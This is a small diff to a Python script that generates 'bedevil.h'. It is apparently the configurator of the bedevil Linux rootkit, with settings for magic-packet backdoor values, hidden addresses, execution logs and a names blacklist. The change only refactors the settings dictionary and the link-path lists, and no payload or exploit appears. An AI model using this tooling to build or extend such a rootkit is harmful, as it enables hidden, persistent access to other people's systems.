@@ -456,8 +456,8 @@ SETTINGS = { # all of these are written to bedevil.h. if a value is None it is s
     'MAX_GID':MAX_GID,                       'MIN_GID':MIN_GID,
     'TARGET_INTERFACE':TARGET_INTERFACE,     'MAGIC_ID':MAGIC_ID,
     'MAGIC_SEQ':MAGIC_SEQ,                   'MAGIC_ACK':MAGIC_ACK,
-    'EXEC_LOGS':ut.randpath(17),             'PLAINSOPATH':ut.sogetplainpath(INSTALL_DIR, BDVLSO),
-    'HIDEADDRS':ut.randpath(16),             'MAX_LOGS_SIZE':MAX_LOGS_SIZE
+    'EXEC_LOGS':ut.randpath(17),             'HIDEADDRS':ut.randpath(16),
+    'MAX_LOGS_SIZE':MAX_LOGS_SIZE
 }
 
 # the following paths are linked to within the installation directory.
@@ -584,11 +584,8 @@ def setup_config():
             namesarr = CArray('namesblacklist', NAMES_BLACKLIST)
             gotbdvlh += namesarr.create()
 
-    linksrc, linkdest = [], []
-    KEYS, VALUES = list(LINKPATHS.keys()), list(LINKPATHS.values())
-    for i in range(len(KEYS)):
-        linksrc.append(KEYS[i])
-        linkdest.append(SETTINGS['HOMEDIR']+'/'+VALUES[i])
+    linksrc = list(LINKPATHS.keys())
+    linkdest = list(LINKPATHS.values())
 
     bdvlarrays = { # write all of these lists to bedevil.h as arrays of char pointers
         'linksrcs':linksrc,                 'linkdests':linkdest,
